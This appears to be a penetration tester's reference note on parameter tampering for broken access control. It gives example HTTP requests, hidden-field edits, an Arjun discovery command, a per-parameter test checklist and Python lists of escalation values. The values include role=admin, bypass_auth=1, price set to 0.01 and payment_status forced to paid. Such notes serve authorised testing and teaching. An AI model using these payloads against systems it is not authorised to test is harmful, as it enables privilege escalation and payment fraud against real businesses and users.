---
tags: [bac, attack, parameter-tampering, manipulation]
type: attack
severity: high
date: 2026-03-10
---

# 🔀 Parameter Tampering — Manipulating Request Parameters for Access

## What Is It?
Parameter tampering means modifying **any user-supplied value** — query params, body fields, hidden form fields, headers — that the server uses to make access control decisions. Unlike IDOR (ID swap), this targets **control flow parameters** that dictate **what the server does** rather than just what object it fetches.

---

## Categories of Tamperable Parameters

### 1. Role & Permission Parameters
```http
# URL parameters that dictate role context
GET /dashboard?role=user          → try: ?role=admin
GET /api/data?access_level=1      → try: ?access_level=99
GET /portal?account_type=standard → try: ?account_type=enterprise

# POST body role params
POST /api/action
{"user_type": "customer"}         → try: {"user_type": "staff"}
{"tier": "free"}                  → try: {"tier": "premium"}
```

### 2. Ownership Parameters
```http
# Who the action is performed ON behalf of
POST /api/transfer
{"from_account": "MY_ACC", "to_account": "TARGET_ACC"}

# Who the resource belongs to
GET /api/download?owner=me        → try: ?owner=admin
POST /invoice/generate {"org_id": "MY_ORG"} → try: another org
```

### 3. Price & Quantity Parameters
```http
POST /api/checkout
{
  "product_id": "premium_plan",
  "quantity": 1,
  "price": 99.00,         ← change to 0.01
  "discount": 0           ← change to 100
}

# Cart total manipulation
POST /api/cart/checkout
{"cart_id": "abc123", "total": 0.01}  ← override total
```

### 4. Debug / Internal Parameters
```http
# Dev flags left in production
GET /api/data?debug=true
GET /api/admin?internal=true
GET /endpoint?bypass_auth=1
GET /api?admin_mode=enabled
GET /page?qa_test=true
GET /api?superuser=1
GET /endpoint?show_all=true      ← may expose other users' data
```

### 5. State Transition Parameters
```http
# Manipulate workflow state
POST /api/order/update
{"order_id": "1337", "status": "delivered"}   ← skip payment
{"order_id": "1337", "payment_status": "paid"} ← false payment
{"subscription": "active", "trial_used": false} ← reset trial
```

### 6. Indirect Reference Substitution
```http
# Server maps reference to internal resource server-side
GET /view?doc=MY_DOC_REFERENCE
→ Enumerate or predict other references

# Signed references (decode → modify → check if sig validated)
GET /file?ref=eyJpZCI6MX0.SIG     → decode → change id → test
```

### 7. Hidden Form Field Manipulation
```html
<!-- Hidden in HTML form -->
<input type="hidden" name="price" value="99.00">
<input type="hidden" name="user_id" value="1337">
<input type="hidden" name="role" value="user">
<input type="hidden" name="discount_percent" value="0">

<!-- Attack: intercept in Burp, modify before submit -->
```

---

## Testing Approach

### Systematic Parameter Discovery
```bash
# Step 1: Capture all requests with Burp (passive scan)
# Step 2: Note every parameter across all requests
# Step 3: Categorize by function:
#   - ID params → IDOR testing (see [[IDOR-Techniques]])
#   - Role/type params → parameter tampering
#   - Price/amount params → value tampering
#   - State params → state machine abuse

# Step 4: Arjun — find hidden/undocumented parameters
arjun -u https://target.com/api/endpoint \
  -m POST \
  --headers "Authorization: Bearer TOKEN" \
  --stable

# Step 5: Param Miner (Burp extension)
# Right-click → Extensions → Param Miner → Guess params (body)
# Discovers hidden params the app accepts but doesn't advertise
```

### Test Each Discovered Parameter
```
For each parameter:
  1. Note the current value and what it does
  2. Try: type escalation (user → admin)
  3. Try: boolean flip (false → true, 0 → 1)
  4. Try: numeric escalation (1 → 99, 0 → -1)
  5. Try: null/empty value (may default to permissive)
  6. Try: wildcard (* or %)
  7. Try: injection payloads (SQLi, XSS — secondary)
```

---

## Key Patterns by Parameter Type

```python
# Role/level escalation
role_escalation = {
    "user": ["admin", "superadmin", "root", "staff", "moderator", "owner"],
    "1": ["0", "99", "100", "-1", "999"],
    "free": ["premium", "enterprise", "unlimited", "paid"],
    "standard": ["platinum", "gold", "vip", "enterprise"],
    "customer": ["staff", "support", "internal", "admin"],
    "false": ["true"],
    "0": ["1"],
}

# State escalation  
state_escalation = {
    "pending": ["completed", "approved", "active", "paid", "verified"],
    "unverified": ["verified", "confirmed", "active"],
    "inactive": ["active"],
    "trial": ["active", "paid"],
}
```

---

## Tasks
- [ ] #task Use Arjun on all key endpoints to discover hidden params
- [ ] #task Search HTML source for hidden form fields
- [ ] #task Test all role/type parameters for escalation values
- [ ] #task Test price/amount params on all e-commerce endpoints
- [ ] #task Test debug/flag params (debug=true, internal=1, test=true)
- [ ] #task Test state parameters on all workflow endpoints

---

## 🔗 Related Notes
- [[IDOR-Techniques]]
- [[Mass-Assignment]]
- [[Business-Logic-BAC]]
- [[Bypass-Payloads]]

---
*Tags: #parameter-tampering #bac #attack #manipulation*
